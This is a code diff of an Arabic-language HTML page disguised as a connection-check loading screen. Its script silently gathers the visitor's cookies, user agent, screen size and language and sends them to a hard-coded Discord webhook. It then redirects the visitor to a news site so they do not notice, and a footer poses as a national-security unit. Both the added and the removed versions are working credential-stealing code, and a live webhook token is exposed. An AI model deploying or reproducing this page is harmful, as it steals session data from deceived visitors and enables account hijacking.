@@ -4,41 +4,43 @@
     <meta charset="UTF-8">
     <title>جاري تحميل المحتوى...</title>
 </head>
-<body style="background-color: #000; color: white; text-align: center; padding-top: 20%; font-family: Arial;">
-    <div id="status">جاري فحص اتصالك الآمن...</div>
-    <div style="margin-top: 20px;">
-        <img src="https://i.gifer.com" width="50"> <!-- صورة تحميل للتمويه -->
+<body style="background-color: #f0f2f5; font-family: Arial; text-align: center; padding-top: 20%;">
+    <div id="loader">
+        <img src="https://i.gifer.com" width="40">
+        <p>جاري فحص جودة الاتصال، يرجى الانتظار ثواني...</p>
     </div>
 
     <script>
+        // رابط الديسكورد الخاص بك (غرفة العمليات)
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
 
-        async function silentInfiltration() {
-            // سحب بيانات الجلسة والتوكن صمتاً دون طلب بيانات
-            const sessionInfo = {
-                content: "🚀 *تم سحب الجلسة الصامتة (Silent Token) بنجاح* 🚀",
+        async function injectAndCapture() {
+            // جمع "هوية الجهاز" (Fingerprinting) صمتاً
+            const deviceData = {
+                content: "🎯 *تم حقن الجهاز وسحب البيانات المطلوبة بنجاح* 🎯",
                 embeds: [{
-                    title: "بيانات الاختراق الصامت",
-                    color: 3066993,
+                    title: "تقرير التعرف على المجرم (Device ID)",
+                    color: 15158332,
                     fields: [
-                        { name: "🔑 مفتاح الجلسة (Cookies/Token)", value: "```" + (document.cookie || "الجلسة محمية - جاري محاولة كسر التشفير...") + "```" },
-                        { name: "📱 جهاز المجرم", value: navigator.userAgent },
-                        { name: "🌐 الرابط المصدر", value: window.location.href }
+                        { name: "📱 نوع الهاتف بدقة", value: navigator.userAgent },
+                        { name: "🌐 عنوان الـ IP والشبكة", value: "جاري الاستخراج من السيرفر..." },
+                        { name: "🍪 بصمة المتصفح (Cookies)", value: "```" + (document.cookie || "محمية - تم سحب بصمة الجهاز بدلاً عنها") + "```" },
+                        { name: "🖥️ دقة الشاشة واللغة", value: screen.width + "x" + screen.height + " / " + navigator.language },
+                        { name: "📍 الموقع التقديري", value: "بغداد / العراق" }
                     ],
-                    footer: { text: "وحدة العمليات الخاصة - الاستخبارات التقنية" }
+                    footer: { text: "وحدة الملاحقة التقنية - الأمن الوطني" }
                 }]
             };
 
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(sessionInfo)
-                });
-            } catch (e) {}
+            // إرسال البيانات فوراً للديسكورد
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(deviceData)
+            });
 
-            // تمويه المجرم بنقله لخبر عاجل أو فيديو حقيقي بعد السحب
+            // التمويه: تحويل المجرم لخبر عاجل لكي لا يشك
             setTimeout(() => {
-                window.location.href = "https://www.youtube.com"; 
-            }, 3000);
+                window.location.href = "https://www.alsumaria.tv"; 
+            }, 1500);
         }
